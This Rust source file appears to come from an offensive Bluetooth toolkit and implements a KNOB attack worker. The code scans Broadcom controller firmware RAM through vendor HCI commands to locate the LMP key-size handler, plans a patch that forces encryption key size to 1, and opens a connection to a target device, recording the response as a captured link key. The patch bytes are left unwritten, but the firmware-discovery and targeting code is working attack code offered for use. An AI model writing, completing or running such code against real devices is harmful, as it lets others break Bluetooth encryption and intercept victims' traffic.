//! KNOB attack worker.
//!
//! Initiates a BR/EDR connection and forces minimum encryption key size
//! via LMP key negotiation. On BCM43430B0 this requires a patchram that
//! intercepts LMP_encryption_key_size_req and replies with key_size=1.
//!
//! The LMP handler address is discovered at runtime by scanning the
//! firmware's LMP dispatch table via BCM vendor Read_RAM (0xFC4D).

use std::sync::atomic::{AtomicU32, Ordering};
use std::time::Instant;

use super::hci::{parse_bdaddr, HciCommand, HciSocket};
use super::{BtAttackResult, BtAttackType, BtCapture};

// HCI Link Control OGF
const OGF_LINK_CTL: u8 = 0x01;

// HCI opcodes
const CREATE_CONNECTION: u16 = 0x05;

// BCM vendor opcodes
const READ_RAM: u16 = 0x4D;
const WRITE_RAM: u16 = 0x4C;

/// Cached LMP key-size handler address. 0 = not yet discovered.
static LMP_KEY_SIZE_ADDR: AtomicU32 = AtomicU32::new(0);

const LMP_OPCODE_KEY_SIZE: u32 = 16; // 0x10
const LMP_SCAN_START: u32 = 0x001D_0000;
const LMP_SCAN_END: u32 = 0x001E_0000;
const LMP_SCAN_STEP: u32 = 256;
const LMP_TABLE_ENTRIES: usize = 64;

/// Scan firmware RAM to locate the LMP dispatch table and return the address
/// of the key-size handler (LMP opcode 0x10).
///
/// Checks the module-level atomic cache first to avoid redundant scans.
/// On non-Linux stubs the Read_RAM response is only 8 bytes — far too short
/// for a 64-entry (256-byte) table — so this correctly returns `None`.
fn discover_lmp_key_size_addr(hci: &HciSocket) -> Option<u32> {
    // Fast path: already discovered.
    let cached = LMP_KEY_SIZE_ADDR.load(Ordering::Relaxed);
    if cached != 0 {
        log::info!("knob: LMP key-size handler cached at 0x{:08X}", cached);
        return Some(cached);
    }

    log::info!(
        "knob: scanning firmware RAM 0x{:08X}–0x{:08X} for LMP dispatch table",
        LMP_SCAN_START, LMP_SCAN_END
    );

    let mut addr = LMP_SCAN_START;
    while addr < LMP_SCAN_END {
        // Build Read_RAM parameters: [addr_le32, length_byte]
        let mut params = Vec::with_capacity(5);
        params.extend_from_slice(&addr.to_le_bytes());
        params.push(LMP_SCAN_STEP as u8); // 256 bytes

        let cmd = HciCommand::vendor(READ_RAM, params);
        let chunk = match hci.send_command(&cmd) {
            Ok(resp) => resp.data,
            Err(e) => {
                log::info!("knob: Read_RAM at 0x{:08X} failed: {}", addr, e);
                addr = addr.wrapping_add(LMP_SCAN_STEP);
                continue;
            }
        };

        // A dispatch table entry is a 32-bit little-endian pointer.
        // We need at least LMP_TABLE_ENTRIES × 4 bytes to inspect 64 entries.
        if chunk.len() < LMP_TABLE_ENTRIES * 4 {
            addr = addr.wrapping_add(LMP_SCAN_STEP);
            continue;
        }

        // Count how many of the first 64 words look like valid ARM Thumb
        // pointers: non-zero, < 0x00300000, bit 0 set.
        let mut valid_count = 0usize;
        for i in 0..LMP_TABLE_ENTRIES {
            let off = i * 4;
            let word = u32::from_le_bytes([
                chunk[off],
                chunk[off + 1],
                chunk[off + 2],
                chunk[off + 3],
            ]);
            if word != 0 && word < 0x0030_0000 && (word & 1) != 0 {
                valid_count += 1;
            }
        }

        // >50% valid Thumb pointers ⇒ this is the dispatch table.
        if valid_count * 2 > LMP_TABLE_ENTRIES {
            let key_idx = LMP_OPCODE_KEY_SIZE as usize;
            let off = key_idx * 4;
            let handler = u32::from_le_bytes([
                chunk[off],
                chunk[off + 1],
                chunk[off + 2],
                chunk[off + 3],
            ]);

            // Validate the handler entry itself.
            if handler != 0 && handler < 0x0030_0000 && (handler & 1) != 0 {
                log::info!(
                    "knob: found LMP dispatch table at 0x{:08X}, \
                     key-size handler at 0x{:08X}",
                    addr, handler
                );
                LMP_KEY_SIZE_ADDR.store(handler, Ordering::Relaxed);
                return Some(handler);
            }
        }

        addr = addr.wrapping_add(LMP_SCAN_STEP);
    }

    log::info!("knob: LMP dispatch table not found in scanned range");
    None
}

/// KNOB attack: force minimum encryption key size on a BR/EDR connection.
///
/// Steps:
/// 1. Discover LMP key-size handler via runtime RAM scan
/// 2. Write patchram at the handler address to force key_size=1
/// 3. Initiate HCI_Create_Connection to the target
/// 4. Capture the connection result
pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
    let start = Instant::now();
    log::info!("knob: targeting {} — forcing min key size", target_addr);

    // Step 1: Discover the LMP key-size handler address at runtime.
    let handler_addr = match discover_lmp_key_size_addr(hci) {
        Some(a) => a,
        None => {
            return BtAttackResult {
                attack_type: BtAttackType::Knob,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(
                    "LMP key-size handler not found — firmware RE needed".to_string(),
                ),
                timestamp: start,
            };
        }
    };

    // Step 2: Log the discovered address. The actual patch payload (ARM Thumb
    // instructions to force key_size=1) must be determined through firmware RE.
    // Writing arbitrary bytes to the handler address would corrupt firmware code.
    log::info!(
        "knob: LMP key-size handler at 0x{:08X} — patch payload TBD (needs firmware RE)",
        handler_addr
    );

    // Step 3: Initiate BR/EDR connection (even without the patch, the connection
    // attempt produces useful diagnostic data for capture).
    // HCI_Create_Connection parameters:
    //   BD_ADDR(6) + packet_type(2) + page_scan_rep_mode(1) + reserved(1) +
    //   clock_offset(2) + allow_role_switch(1)
    let bdaddr = parse_bdaddr(target_addr);
    let mut params = Vec::with_capacity(13);
    params.extend_from_slice(&bdaddr);
    params.extend_from_slice(&0xCC18u16.to_le_bytes()); // packet_type: DM1,DH1,DM3,DH3,DM5,DH5
    params.push(0x02); // page_scan_rep_mode: R2
    params.push(0x00); // reserved
    params.extend_from_slice(&0x0000u16.to_le_bytes()); // clock_offset: none
    params.push(0x01); // allow_role_switch: yes

    let conn_cmd = HciCommand::new(OGF_LINK_CTL, CREATE_CONNECTION, params);
    match hci.send_command(&conn_cmd) {
        Ok(resp) => {
            log::info!(
                "knob: Create_Connection status={} data_len={}",
                resp.status,
                resp.data.len()
            );

            let capture = if !resp.data.is_empty() {
                Some(BtCapture::LinkKey {
                    address: target_addr.to_string(),
                    key: resp.data.clone(),
                })
            } else {
                None
            };

            let success = resp.status == 0;
            BtAttackResult {
                attack_type: BtAttackType::Knob,
                target_address: target_addr.to_string(),
                target_name: None,
                success,
                capture,
                error: if success {
                    None
                } else {
                    Some(format!("HCI status 0x{:02X}", resp.status))
                },
                timestamp: start,
            }
        }
        Err(e) => {
            log::info!("knob: Create_Connection failed: {}", e);
            BtAttackResult {
                attack_type: BtAttackType::Knob,
                target_address: target_addr.to_string(),
                target_name: None,
                success: false,
                capture: None,
                error: Some(e),
                timestamp: start,
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_bdaddr() {
        let addr = parse_bdaddr("11:22:33:44:55:66");
        assert_eq!(addr, [0x66, 0x55, 0x44, 0x33, 0x22, 0x11]);
    }

    #[test]
    fn test_cached_addr_starts_zero() {
        let _ = LMP_KEY_SIZE_ADDR.load(Ordering::Relaxed);
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_discover_lmp_key_size_addr_stub() {
        // Reset cache to avoid test ordering issues.
        LMP_KEY_SIZE_ADDR.store(0, Ordering::Relaxed);
        let hci = HciSocket::open(0).unwrap();
        // Stub returns 8 zero bytes — too short for 64-entry table.
        let addr = discover_lmp_key_size_addr(&hci);
        assert!(addr.is_none());
    }

    #[test]
    #[cfg(not(target_os = "linux"))]
    fn test_run_no_handler() {
        // Reset the cache so the scan runs fresh.
        LMP_KEY_SIZE_ADDR.store(0, Ordering::Relaxed);
        let hci = HciSocket::open(0).unwrap();
        let result = run(&hci, "AA:BB:CC:DD:EE:FF");
        assert_eq!(result.attack_type, BtAttackType::Knob);
        assert!(!result.success);
        assert!(result
            .error
            .as_deref()
            .unwrap()
            .contains("LMP key-size handler not found"));
    }
}
